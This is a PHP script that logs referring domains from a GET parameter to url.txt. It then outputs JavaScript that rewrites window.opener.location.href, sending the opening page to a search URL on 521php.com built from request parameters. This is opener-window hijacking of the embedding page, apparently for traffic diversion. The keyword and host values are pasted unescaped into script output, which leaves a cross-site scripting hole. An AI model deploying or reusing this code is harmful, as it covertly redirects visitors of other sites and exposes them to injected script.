<?php
header("Content-Type:text/html;charset=utf-8");
$u = $_SERVER['HTTP_REFERER'];
if($u){
$url = @$_GET['url'];
$h   = @$_GET['host']?@$_GET['host']:'';
$uh   = @$_GET['uh'];
if($uh){
	$f = 'url.txt';
	$info = file($f);//记录域名
	if(!in_array($uh."\r\n",$info)){
	   $file = fopen($f,'a+');
	   fwrite($file,$uh."\r\n");
	   fclose($file);
	}
}
if($url){	
	$a = @$_GET['keyword'];
	if('baidu'==$url){
		$bd = @$_GET['page'];
		$gg=0;
	}elseif('google'==$url){
		$bd = 0;
		if(@$_GET['page']==='0'){
			$gg=0;
		}else{
			$gg=ceil(@$_GET['page']/10)*10-10;
		}
	}
	if($h){
		$gg=0;
		$bd = 0;
	}
	if($a[1]){

			if(!empty($h)){
				$url = 'http://www.521php.com/so.php?url='.$h.'&s='.$a;
			}else{
				$url = 'http://www.521php.com/so.php?url='.$h.'&s='.$a.'&pn='.$bd.'&start='.$gg;
			}
		
?>
		if(navigator.appName != "Microsoft Internet Explorer"){
			<?php
			echo 'window.opener.location.href="'.$url.'"';	
			?>
		}else{
			<?php
			echo 'window.open("'.$url.'")';	
			?>
		}
<?php
		
	}
 }
}
?>
